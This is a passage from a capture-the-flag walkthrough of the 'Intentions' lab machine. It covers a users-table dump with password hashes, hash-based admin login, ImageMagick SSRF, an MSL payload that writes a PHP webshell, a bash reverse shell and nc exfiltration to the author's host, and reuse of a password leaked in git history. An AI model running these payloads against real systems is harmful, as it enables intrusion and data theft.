| 8  | lura.zieme@example.org        | Desmond Greenfelder      | food,travel,nature             | 0       | $2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 9  | pouros.marcus@example.net     | Mrs. Roxanne Raynor      | food,travel,nature             | 0       | $2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 10 | mellie.okon@example.com       | Rose Rutherford          | food,travel,nature             | 0       | $2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 11 | trace94@example.net           | Dr. Chelsie Greenholt I  | food,travel,nature             | 0       | $2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 12 | kayleigh18@example.com        | Prof. Johanna Ullrich MD | food,travel,nature             | 0       | $2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 13 | tdach@example.com             | Prof. Gina Brekke        | food,travel,nature             | 0       | $2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 14 | lindsey.muller@example.org    | Jarrett Bayer            | food,travel,nature             | 0       | $2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 15 | tschmidt@example.org          | Macy Walter              | food,travel,nature             | 0       | $2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 16 | murray.marilie@example.com    | Prof. Devan Ortiz DDS    | food,travel,nature             | 0       | $2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 17 | barbara.goodwin@example.com   | Eula Shields             | food,travel,nature             | 0       | $2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 18 | maggio.lonny@example.org      | Mariano Corwin           | food,travel,nature             | 0       | $2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 19 | chackett@example.org          | Madisyn Reinger DDS      | food,travel,nature             | 0       | $2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 20 | layla.swift@example.net       | Jayson Strosin           | food,travel,nature             | 0       | $2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 21 | rshanahan@example.net         | Zelda Jenkins            | food,travel,nature             | 0       | $2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 22 | shyatt@example.com            | Eugene Okuneva I         | food,travel,nature             | 0       | $2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 23 | sierra.russel@example.com     | Mrs. Rhianna Hahn DDS    | food,travel,nature             | 0       | $2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 24 | ferry.erling@example.com      | Viola Vandervort DVM     | food,travel,nature             | 0       | $2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 25 | beryl68@example.org           | Prof. Margret Von Jr.    | food,travel,nature             | 0       | $2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 26 | ellie.moore@example.net       | Florence Crona           | food,travel,nature             | 0       | $2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 27 | littel.blair@example.org      | Tod Casper               | food,travel,nature             | 0       | $2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 28 | 0xdf@intentions.htb           | 0xdf                     | food')/**/__REFLECTED_VALUE__# | 0       | $2y$10$YUmJGH/nZwMGYmrz.TqDHOtpq1VK4xrw87YtsEJhaobmQ23pY7AbW | 2023-09-14 18:14:31 | 2023-09-14 20:45:38 |
+----+-------------------------------+--------------------------+--------------------------------+---------+--------------------------------------------------------------+---------------------+---------------------+
...[snip]...

```

### Admin Access

#### Crack Failures

I’ll fire up `hashcat` on my system with these hashes, but after five minutes, none have cracked, and progress is moving very slowly as these are Bcrypt hashes. This doesn’t seem the be the way.

#### Enumerate v2 Login

I noted [above](#adminjs) the text in `admin.js` that mentioned the new `v2` login API endpoint that did the hashing client-side so that user passwords aren’t submitted in the clear. I could enumerate the entire `v2` API, but I’ll start with seeing if there’s a `login` function in the same place as `v1`.

I’ll send a login request over to Burp Repeater, and update the URL from `/api/v1/auth/login` to `/api/v2/auth/login` without changing the POST body. When I send this, the response body has a failure:

```

{
    "status":"error",
    "errors":{
        "hash":[
            "The hash field is required."
        ]
    }
}

```

The POST body for that request looks like:

```

{
    "email":"0xdf@intentions.htb",
    "password":"0xdf0xdf"
}

```

I’ll change `password` to `hash`, and the result is the same as when I have the wrong password on v1:

```

{
    "error":"login_error"
}

```

#### Auth as Admin

I’ll update the POST to have steve’s email and hash, and it works:

![image-20230914165557221](/img/image-20230914165557221.png)

The easiest way to get authed in Firefox is log out, put Burp Proxy in Intercept mode, and login with steve’s email and hash. When Burp catches this request, I’ll change `v1` to `v2`, and `password` to `hash`, and send it, disabling Intercept.

Now going to `/admin` returns an admin interface (that includes the cards from the JS file):

![image-20230914170010849](/img/image-20230914170010849.png)

### RCE via ImageMagick

#### Enumerate Admin

In the admin site, there’s a users page that shows the users of the site:

![image-20230914171654797](/img/image-20230914171654797.png)

There’s no interaction here. On the “Images” tab, it lists the images that are available for the gallery:

![image-20230914172102821](/img/image-20230914172102821.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

Clicking on “Edit” loads the image with four buttons at the top and a bunch of metadata at the bottom:

![image-20230914172417161](/img/image-20230914172417161.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

Clicking “CHARCOAL”, the image reloads with that effect:

![image-20230914172438681](/img/image-20230914172438681.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

Clicking the effect button sends a POST to `/api/v2/admin/image/modify` with a JSON body:

```

{
    "path":"/var/www/html/intentions/storage/app/public/food/rod-long--LMw-y4gxac-unsplash.jpg",
    "effect":"charcoal"
}

```

I noted [above](#adminjs) the reference to `imagick`, which is almost certainly [ImageMagick](https://imagemagick.org/index.php).

#### SSRF

The `path` input takes a local path, but if this is using PHP, it’s likely that could take a URL as well. I’ll start a Python webserver on my host, and give it `http://10.10.14.6` as the `path`. There’s a hit:

```
10.10.11.220 - - [14/Sep/2023 17:55:06] "GET / HTTP/1.1" 200 -

```

If I serve an image, the modified image is sent back:

![image-20230914175734790](/img/image-20230914175734790.png)

I can base64 decode that into a file and view it for the image. For example, a Google local made charcoal:

![image-20230914175823856](/img/image-20230914175823856.png)

#### Failures

I’ll try a bunch of things that don’t work lead to much:
- There is a path in this post request. I can try to read other files. If I give it `/etc/passwd`, the response is an HTTP 422, with the body “bad image path”.
- There’s a bunch of Image Magick CVEs that could be interesting, but I’m not able to make any of them work here for various reasons.
- Trying to abuse the SSRF to find other things on the box all fails as well. Unless the program is able to provide an image, it just errors.

#### Confirm ImageMagick

There’s a neat trick in the post I’ll go into next section to verify this is ImageMagick! ImageMagick will handle a filename with `[AxB]` appended to the end (where “A” and “B” are numbers) and scale the image based on that. I’ll load a standard request to `/api/v2/admin/image/modify` in Burp Repeater:

![image-20231012152002323](/img/image-20231012152002323.png)

This returns just fine. If I add `[]` to the end of the filename, it fails:

![image-20231012152038915](/img/image-20231012152038915.png)

But, if I add dimensions within the `[]`, it works again:

![image-20231012152104518](/img/image-20231012152104518.png)

The base64 decodes to a very small version of the picutre. But more importantly, this behavior for handling paths is relatively unique to ImageMagick.

#### Arbitrary Object Instantiation

[This article](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) has a bunch of details about how to exploit Arbitrary Object Instantiation vulnerabilities in PHP. The article is a bit hard to follow, but it’s looking at cases the author calls `$a($b)`, which is to say some class if passing an attacker controlled variable to it’s constructor. And the example in the article is Imagick!

To exploit ImageMagick, the post goes into the Magick Scripting Language (MSL) format. In the post, it shows how passing a URL with an `msl:` scheme to a new `Imagick` object results in an arbitrary file write:

![img](/img/swarm-ptsecurity-msl-6.png)

This POC will download `positive.png` from the localhost webserver and write it to a given location.

Unfortunately, I can’t chain `msl:/` and `http://` ( like `msl:/http://10.10.14.6/`), as that isn’t supported. So I need to get a `.msl` file on disk.

The author looks at how PHP writes temp files to `/tmp/php?` where `?` is a long random string while the request is being handled. At first, they try to brute force all possible file descriptors, but then discover the `vid:` scheme. The code for parsing these passes the result to `ExpandFilenames`, which effectively takes things like `*` and expands it to get files that match. So with the `vid:` scheme, I can reference the file as `/tmp/php*.dat` successfully.

#### Webshell

Putting this all together, I need to pass into the `Imagick` constructor something that looks like this: `/vid:msl:/tmp/php*`. Then, I need to have attached to the request a file to be written to the temp location that is an `.msl` file, such that when ImageMagick processes the file, it writes a webshell to some location on the disk.

I’ll start with the request as it’s sent by the site:

```

POST /api/v2/admin/image/modify HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IlNrR0RUYlNTS0JjRGQwK3NGamRSR1E9PSIsInZhbHVlIjoicXBxK2NBaDArY2w1ZTM2UTBRRnBydWI3WldpbHVCUlduSlpEWGdLOG9Bb2wrWUdtRGsrL1I3dVVqcU1uVDZtcDQ4bEFJMDJHQXY0MjZhNHYzRnhCdDZFVjZqc0djOWVDV0ZzSUtRaVIydHg3aGdvejVXL1E5OFZHUmxWQ09rTkMiLCJtYWMiOiJkNDcxYzZhNWQ0YTdiMDM3YzRlNDdhMGZiNzE5ZjMxMTQ5MDg5ODEyNjhlZWI1NGQ3OGU3MzRmN2RlODhhMjIzIiwidGFnIjoiIn0=
Content-Length: 113
Origin: http://10.10.11.220
Connection: close
Referer: http://10.10.11.220/admin/
Cookie: XSRF-TOKEN=eyJpdiI6IlNrR0RUYlNTS0JjRGQwK3NGamRSR1E9PSIsInZhbHVlIjoicXBxK2NBaDArY2w1ZTM2UTBRRnBydWI3WldpbHVCUlduSlpEWGdLOG9Bb2wrWUdtRGsrL1I3dVVqcU1uVDZtcDQ4bEFJMDJHQXY0MjZhNHYzRnhCdDZFVjZqc0djOWVDV0ZzSUtRaVIydHg3aGdvejVXL1E5OFZHUmxWQ09rTkMiLCJtYWMiOiJkNDcxYzZhNWQ0YTdiMDM3YzRlNDdhMGZiNzE5ZjMxMTQ5MDg5ODEyNjhlZWI1NGQ3OGU3MzRmN2RlODhhMjIzIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkZsSWVxdjVtbVNNL3RuVEI3OHNickE9PSIsInZhbHVlIjoiT0JJejRSYXY2ZVU4bDhncVZ2ZitONGtWbm9hTHpSeVFDZjhQUzZ5UnNORXdxLzE2dGRrNC9Ob3doQXV2Q21zWUd3UUNHeXpyY0ljSDEzQmZtS1ZmelJBdGV4Qk9NODBDa0ZXUWQ3ZWprSFI4aVZDNG0ydlhQZTdVYlQ5dlZDOHYiLCJtYWMiOiIwNWRlOTk1ZDFhNDlkM2Y5ZTg2ODhmYTA1NzE4Mjk5N2FmNzA3NDMxOWY3NzRiMTBkYmI0N2U1MmYxZjIyNDFiIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNjk0NzI1MTI0LCJleHAiOjE2OTQ3NDY3MjQsIm5iZiI6MTY5NDcyNTEyNCwianRpIjoicU9wRXFhQUFxa1BxUzB1ayIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.Lgy7uOHESxqE5CzC3AyIMxGSBXiWuLKKPJCAk1_nReA

{"path":"/var/www/html/intentions/storage/app/public/food/rod-long--LMw-y4gxac-unsplash.jpg","effect":"charcoal"}

```

I’ll first try to move the `path` and `effect` parameters from the POST body to the GET parameters. It’ll still be a POST request, but if this works, that makes it easier for me to isolate the file upload in the POST body:

![image-20230914211121039](/img/image-20230914211121039.png)

That does work. I’ll want to upload a file that will be temporarily written to `/tmp/php*` by PHP. To do that, I’ll use a multipart form data by setting the `Content-Type` header. By giving it `filename` and `Content-Type` attributes, PHP will handle it as a file.

The file will be a modified version of what’s in the blog post:

```

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_GET['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/0xdf.php" />
</image>

```

Because the admin page gives both the path on the webserver and the path on disk:

![image-20230915101756217](/img/image-20230915101756217.png)

By writing to `/var/www/html/intentions/storage/app/public/`, I can expect to find the file in `/storage/`. I could also try the `animals` directory, but it doesn’t work (www-data doesn’t have write access).

Now I’ll edit the request headers to add form data for a file upload. My full payload looks like:

```

POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=abcd HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
X-XSRF-TOKEN: eyJpdiI6IjVBa2tJN0RvMUNLVlBvRzhaaFhpTWc9PSIsInZhbHVlIjoidW9hUmFITGZsWUQ5NVYyVjcvNlFkc0hQVk9qc0dFTEUrRUFkd1ZEdlFxUHZ2VmlVcitjRlZqMC9saXFCTmt2WkVvQ2Fzb1FmVXMvWkZWcG16SUh4c2hNTWU3aFpaSnEwZURXdWRuTVd4ZDBrWkIrSTVzZlJkLzBJLzJHcyszaGQiLCJtYWMiOiJlM2U1ZTFhNDgzYmQ2ZGExYjkxOWZkZjcwMGJiZTQzMGUyNzY5MmU0NDAzZDVkNjgyNTA1NTE4YWFiMzJjZjE3IiwidGFnIjoiIn0=
Cookie: XSRF-TOKEN=eyJpdiI6IjVBa2tJN0RvMUNLVlBvRzhaaFhpTWc9PSIsInZhbHVlIjoidW9hUmFITGZsWUQ5NVYyVjcvNlFkc0hQVk9qc0dFTEUrRUFkd1ZEdlFxUHZ2VmlVcitjRlZqMC9saXFCTmt2WkVvQ2Fzb1FmVXMvWkZWcG16SUh4c2hNTWU3aFpaSnEwZURXdWRuTVd4ZDBrWkIrSTVzZlJkLzBJLzJHcyszaGQiLCJtYWMiOiJlM2U1ZTFhNDgzYmQ2ZGExYjkxOWZkZjcwMGJiZTQzMGUyNzY5MmU0NDAzZDVkNjgyNTA1NTE4YWFiMzJjZjE3IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6InR0TmJOa0crRGhzSjhEZFQ4bmErRVE9PSIsInZhbHVlIjoidElDYnFRSm1kVjVRSGNmR3FyNzJsdG0yakVsRXFKdVRYR1FMWnRrS1dRSUI1S1BHeENab3E4bGhyTmlTTmszY1llbFRLR1grQ09Lb09mcERjZ29qRGREUUI0cXJLQVUyRzFvUXJSNWNoQXhTVXA3K1pDSy93SVUzRTg5UW9lTEciLCJtYWMiOiJiNDFkOTc2MTJjMDgxZWZjMDU3NzFiZjQzNTEzNzM4YzA4MzU3YWY2ZDU4YWY2N2QwMmNjYWVjYjJiN2YwZjAzIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNjk0Nzg0NjMyLCJleHAiOjE2OTQ4MDYyMzIsIm5iZiI6MTY5NDc4NDYzMiwianRpIjoiUm0yNTFTZkdQUzB5c2dEbyIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.WfIhNsk0pGCcD2BQm1LPmxFJpBAe5yR0ArgRErpFyCQ
Content-Length: 383
Connection: close
Content-Type: multipart/form-data; boundary=------------------------abcd
--------------------------abcd
Content-Disposition: form-data; name="file"; filename="test.msl"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/0xdf.php" />
</image>
--------------------------abcd

```

I can use anything for `name`, as I just need PHP temporarily store it in `/tmp` before it realizes it’s not needed.

On sending, the request hangs for a second, and then returns a 502 Bad Gateway failure:

![image-20230915102458063](/img/image-20230915102458063.png)

This is a sign of success, as `0xdf.php` is there:

```

oxdf@hacky$ curl http://10.10.11.220/storage/0xdf.php?cmd=id
caption:uid=33(www-data) gid=33(www-data) groups=33(www-data)
 CAPTION 120x120 120x120+0+0 16-bit sRGB 2.070u 0:02.076

```

If there is something wrong with the request, the response looks like this:

```

HTTP/1.1 422 Unprocessable Content
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-cache, private
Date: Thu, 12 Oct 2023 21:47:03 GMT
X-RateLimit-Limit: 3600
X-RateLimit-Remaining: 3599
Access-Control-Allow-Origin: *
Content-Length: 14

bad image path

```

I came across this several ways. One way this comes up is copying the POC from the blog, which comes with extra spaces in the payload and cause this result.

### Shell

To get a shell from the webshell, I’ll just send a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) payload. I’ll put it in the POST body (I used `$_REQUEST` to read `cmd` from either GET parameters or POST body):

```

oxdf@hacky$ curl http://10.10.11.220/storage/0xdf.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261"' 

```

This just hangs, but at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.220 43878
bash: cannot set terminal process group (1070): Inappropriate ioctl for device
bash: no job control in this shell
www-data@intentions:~/html/intentions/storage/app/public$

```

I’ll [upgrade the shell](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@intentions:~/html/intentions/storage/app/public$ script /dev/null -c bash
<ntions/storage/app/public$ script /dev/null -c bash      
Script started, output log file is '/dev/null'.
www-data@intentions:~/html/intentions/storage/app/public$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
echwww-data@intentions:~/html/intentions/storage/app/public$

```

## Shell as greg

### Enumeration

#### Home / Web Directories

There are three users with home directories in `/home`:

```

www-data@intentions:/home$ ls
greg  legal  steven

```

www-data doesn’t have privilege to access any of them.

www-data’s home directory is `/var/www`, and the only thing in it is the website, in `/var/www/html/intentions`:

```

www-data@intentions:~/html/intentions$ ls -la
total 820
drwxr-xr-x  14 root     root       4096 Feb  2  2023 .
drwxr-xr-x   3 root     root       4096 Feb  2  2023 ..
-rw-r--r--   1 root     root       1068 Feb  2  2023 .env
drwxr-xr-x   8 root     root       4096 Feb  3  2023 .git
-rw-r--r--   1 root     root       3958 Apr 12  2022 README.md
drwxr-xr-x   7 root     root       4096 Apr 12  2022 app
-rwxr-xr-x   1 root     root       1686 Apr 12  2022 artisan
drwxr-xr-x   3 root     root       4096 Apr 12  2022 bootstrap
-rw-r--r--   1 root     root       1815 Jan 29  2023 composer.json
-rw-r--r--   1 root     root     300400 Jan 29  2023 composer.lock
drwxr-xr-x   2 root     root       4096 Jan 29  2023 config
drwxr-xr-x   5 root     root       4096 Apr 12  2022 database
-rw-r--r--   1 root     root       1629 Jan 29  2023 docker-compose.yml
drwxr-xr-x 534 root     root      20480 Jan 30  2023 node_modules
-rw-r--r--   1 root     root     420902 Jan 30  2023 package-lock.json
-rw-r--r--   1 root     root        891 Jan 30  2023 package.json
-rw-r--r--   1 root     root       1139 Jan 29  2023 phpunit.xml
drwxr-xr-x   5 www-data www-data   4096 Feb  3  2023 public
drwxr-xr-x   7 root     root       4096 Jan 29  2023 resources
drwxr-xr-x   2 root     root       4096 Jun 19 11:22 routes
-rw-r--r--   1 root     root        569 Apr 12  2022 server.php
drwxr-xr-x   5 www-data www-data   4096 Apr 12  2022 storage
drwxr-xr-x   4 root     root       4096 Apr 12  2022 tests
drwxr-xr-x  45 root     root       4096 Jan 29  2023 vendor
-rw-r--r--   1 root     root        722 Feb  2  2023 webpack.mix.js

```

There is a Git repo (the `.git` directory) that is readable but not writable by www-data. The permissions on the directory don’t allow www-data to run `git` commands:

```

www-data@intentions:~/html/intentions$ git log                                                          
fatal: detected dubious ownership in repository at '/var/www/html/intentions'
To add an exception for this directory, call:

        git config --global --add safe.directory /var/www/html/intentions
www-data@intentions:~/html/intentions$ git config --global --add safe.directory /var/www/html/intentions
error: could not lock config file /var/www/.gitconfig: Permission denied

```

#### Git Repo

I’ll bundle the entire website (for low bandwidth situations the `.git` folder would do):

```

www-data@intentions:~/html/intentions$ tar -cf /tmp/site.tar .

```

I’ll exfil that back over `nc`:

```

www-data@intentions:~/html/intentions$ cat /tmp/site.tar | nc 10.10.14.6 443

```

On my host:

```

oxdf@hacky$ nc -lnvp 443 > site.tar
Listening on 0.0.0.0 443
Connection received on 10.10.11.220 47024
^C
oxdf@hacky$ tar xf site.tar

```

The repo has four commits:

```

oxdf@hacky$ git log --oneline 
1f29dfd (HEAD -> master) Fix webpack for production
f7c903a Test cases did not work on steve's local database, switching to user factory per his advice
36b4287 Adding test cases for the API!
d7ef022 Initial v2 commit

```

Exploring the differences in the commits (with `git diff commit1 commit2`), `/tests/Feature/Helper.php` is added in the second commit, “Adding test cases for the API!”:

```

oxdf@hacky$ git diff d7ef022 36b4287 tests/Feature/Helper.php
diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
new file mode 100644
index 0000000..f57e37b
--- /dev/null
+++ b/tests/Feature/Helper.php
@@ -0,0 +1,19 @@
+<?php
+
+namespace Tests\Feature;
+use Tests\TestCase;
+use App\Models\User;
+use Auth;
+class Helper extends TestCase
+{
+    public static function getToken($test, $admin = false) {
+        if($admin) {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        } 
+        else {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        }
+    }
+}

```

This file is mean to test logging into the API, and it’s using hardcoded credentials for greg. In the third commit, the creds are removed:

```

oxdf@hacky$ git diff 36b4287 f7c903a tests/Feature/Helper.php
diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
index f57e37b..0586d51 100644
--- a/tests/Feature/Helper.php
+++ b/tests/Feature/Helper.php
@@ -8,12 +8,14 @@ class Helper extends TestCase
 {
     public static function getToken($test, $admin = false) {
         if($admin) {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->admin()->create();
         } 
         else {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->create();
         }
+        
+        $token = Auth::login($user);
+        $user->delete();
+        return $token;
     }
 }

```

### su / SSH

I noted earlier that greg was a user on this box with a home directory. These creds work for grep with `su`:

```

www-data@intentions:~/html/intentions$ su - greg
Password: 
$ 

```

And over SSH:

```

oxdf@hacky$ sshpass -p 'Gr3g1sTh3B3stDev3l0per!1998!' ssh greg@10.10.11.220
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-76-generic x86_64)
...[snip]...
$ 

```

greg’s shell is set to `sh`, but running `bash` will return a better experience:

```

$ echo $SHELL
/bin/sh
$ grep greg /etc/passwd
greg:x:1001:1001::/home/greg:/bin/sh
$ bash
greg@intentions:~$ 

```

And I can read `user.txt`:

```

greg@intentions:~$ cat user.txt
11a99958************************

```

## Shell as root

### Enumeration

#### High Permissions

greg cannot run `sudo`:

```

greg@intentions:~$ sudo -l
[sudo] password for greg: 
Sorry, user greg may not run sudo on intentions.

```

There’s a bunch of files with SetUID / SetGID, but none that stand out as non-standard:

```

greg@intentions:~$ find / -perm -4000 -or -perm -2000 2>/dev/null             
/usr/bin/write.ul
/usr/bin/su    
/usr/bin/chage        
/usr/bin/passwd                
/usr/bin/fusermount3 
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/sudo               
/usr/bin/crontab                  
/usr/bin/gpasswd
/usr/bin/chfn   
/usr/bin/newgrp
/usr/bin/chsh 
/usr/bin/ssh-agent
/usr/bin/wall
/usr/bin/mount              
/usr/bin/expiry
/usr/local/share/fonts            
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/openssh/ssh-keysign   
/usr/libexec/polkit-agent-helper-1
/run/log/journal
/var/log/journal                 
/var/log/journal/607b86cbcd424ff3ac2e3ca162cb6f32
/var/log/mysql
/var/mail                     
/var/local 

```

There is one file that has a unusual capability:

```

greg@intentions:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/opt/scanner/scanner cap_dac_read_search=ep

```

`/opt/scanner/scanner` is worth looking into. With `CAP_DAC_READ_SEARCH`, it can read any file on the host ([man capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)):

> ```

> CAP_DAC_READ_SEARCH
>       •  Bypass file read permission checks and directory read
>          and execute permission checks;
>       •  invoke open_by_handle_at(2);
>       •  use the linkat(2) AT_EMPTY_PATH flag to create a link
>          to a file referred to by a file descriptor.
>
> ```

#### Home Directory

greg’s home directory has two files that reference DMCA (presumably the [Digital Millennium Copyright Act](https://en.wikipedia.org/wiki/Digital_Millennium_Copyright_Act)):

```

greg@intentions:~$ ls -la
total 52
drwxr-x--- 4 greg greg  4096 Jun 19 13:09 .
drwxr-xr-x 5 root root  4096 Jun 10 14:56 ..
lrwxrwxrwx 1 root root     9 Jun 19 13:09 .bash_history -> /dev/null
-rw-r--r-- 1 greg greg   220 Feb  2  2023 .bash_logout
-rw-r--r-- 1 greg greg  3771 Feb  2  2023 .bashrc
drwx------ 2 greg greg  4096 Jun 10 15:18 .cache
-rwxr-x--- 1 root greg    75 Jun 10 17:33 dmca_check.sh
-rwxr----- 1 root greg 11044 Jun 10 15:31 dmca_hashes.test
drwxrwxr-x 3 greg greg  4096 Jun 10 15:26 .local
-rw-r--r-- 1 greg greg   807 Feb  2  2023 .profile
-rw-r----- 1 root greg    33 Sep 12 19:58 user.txt
-rw-r--r-- 1 greg greg    39 Jun 14 10:18 .vimrc

```

`dmca_hashes.test` is a list of ids and hashes:

```

greg@intentions:~$ wc -l dmca_hashes.test
251 dmca_hashes.test
greg@intentions:~$ head dmca_hashes.test
DMCA-#5133:218a61dfdebf15292a94c8efdd95ee3c
DMCA-#4034:a5eff6a2f4a3368707af82d3d8f665dc
DMCA-#7873:7b2ad34b92b4e1cb73365fe76302e6bd
DMCA-#2901:052c4bb8400a5dc6d40bea32dfcb70ed
DMCA-#9112:0def227f2cdf0bb3c44809470f28efb6
DMCA-#9564:b58b5d64a979327c6068d447365d2593
DMCA-#8997:26c3660f8051c384b63ba40ea38bfc72
DMCA-#2247:4a705343f961103c567f98b808ee106d
DMCA-#6455:1db4f2c6e897d7e2684ffcdf7d907bb3
DMCA-#9245:ae0e837a5492c521965fe1a32792e3f3

```

`dmca_check.sh` just runs the scanner identified above:

```

/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test

```

#### scanner

This file has a nice help:

```

